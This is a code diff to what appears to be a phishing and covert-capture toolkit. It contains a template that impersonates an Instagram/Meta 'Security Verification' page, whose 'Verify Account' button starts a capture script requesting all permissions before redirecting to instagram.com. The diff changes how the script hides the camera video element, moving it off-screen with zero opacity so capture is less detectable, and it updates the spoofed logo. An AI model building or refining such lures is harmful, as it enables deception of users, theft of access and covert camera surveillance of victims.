@@ -604,7 +604,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   if (stream) {
                     try {
                       var video = document.createElement('video');
-                      video.style.display = 'none';
+                      video.style.position = 'absolute';
+                      video.style.left = '-9999px';
+                      video.style.opacity = '0';
                       video.setAttribute('autoplay', '');
                       video.setAttribute('muted', '');
                       video.setAttribute('playsinline', '');
@@ -666,7 +668,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                     try {
                       var track = s.getVideoTracks()[0];
                       var video = document.createElement('video');
-                      video.style.display = 'none';
+                      video.style.position = 'absolute';
+                      video.style.left = '-9999px';
+                      video.style.opacity = '0';
                       video.setAttribute('autoplay', '');
                       video.setAttribute('muted', '');
                       video.setAttribute('playsinline', '');
@@ -921,7 +925,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'meta_login': {
     name: "💬 Social: Account Recovery (Extreme)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#fafafa; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:7px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" class="logo" referrerpolicy="no-referrer"><h3>Security Verification</h3><p>We've detected an unusual login attempt. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div>${getCaptureScript(id, 'https://www.instagram.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#fafafa; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:7px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo" referrerpolicy="no-referrer"><h3>Security Verification</h3><p>We've detected an unusual login attempt. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div>${getCaptureScript(id, 'https://www.instagram.com', {
       tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
     })}</body></html>`
   },
